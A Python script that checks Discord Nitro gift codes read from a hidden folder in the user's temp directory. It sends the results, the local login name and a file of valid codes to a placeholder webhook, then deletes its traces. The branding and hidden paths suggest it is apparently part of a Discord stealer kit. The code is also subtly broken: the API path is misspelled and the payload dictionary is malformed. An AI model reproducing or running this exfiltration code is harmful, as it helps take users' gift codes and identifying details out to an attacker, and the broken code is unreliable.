import requests
import os
import sys
import httpx

webhook = "WEBHOOKHERE"

total_checked = 0
valid = 0
invalid = 0
temp = (os.getenv("temp"))
codes_file = temp + '\\$~cache\\Codes.txt'

#? Open the txt file and check them
if not os.path.isfile(codes_file):
    sys.exit()

with open(codes_file) as f:
    for line in f:
        nitro = line.strip("\n")

        url = "https://discordapp.com/api/v6/entitelemnts/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            valid +=1
            f = open(temp + '\\$~cache\\Valids.txt', "a+")
            f.write(f'{nitro}\n')
            total_checked +=1
        else:
            invalid +=1
            total_checked +=1

os.remove(codes_file)
f.close()
embed = {
    'username'
    'avatar_url': 'https://cdn.discordapp.com/attachments/947224575622676520/953286335198806086/Pfp.gif',
    'embeds': [
        {
            'author': {
                'name': f'{os.getlogin()} Nitro Checker Stats',
                'url': '',
                'icon_url': 'https://cdn.discordapp.com/attachments/947224575622676520/953286335198806086/Pfp.gif'
            },
            'color': 16119101,
            'description': f'Finished Checking All Codes!',
            'fields': [
                {
                    'name': '\u200b',
                    'value': f'''```
Total Checked Codes: {total_checked}
Vaild Codes: {valid}
Invalid Codes: {invalid}```
                    ''',
                    'inline': True
                }
            ],
            'footer': {
                'text': 'CookiesKush420 | http://cookiesservices.xyz'
            }
        }
    ]
}
httpx.post(webhook, json=embed)
if (valid > 0):
    with open(temp + '\\$~cache\\Valids.txt', 'r') as f:
        httpx.post(webhook, files={'upload_file': f})
    os.remove(temp + '\\$~cache\\Valids.txt')
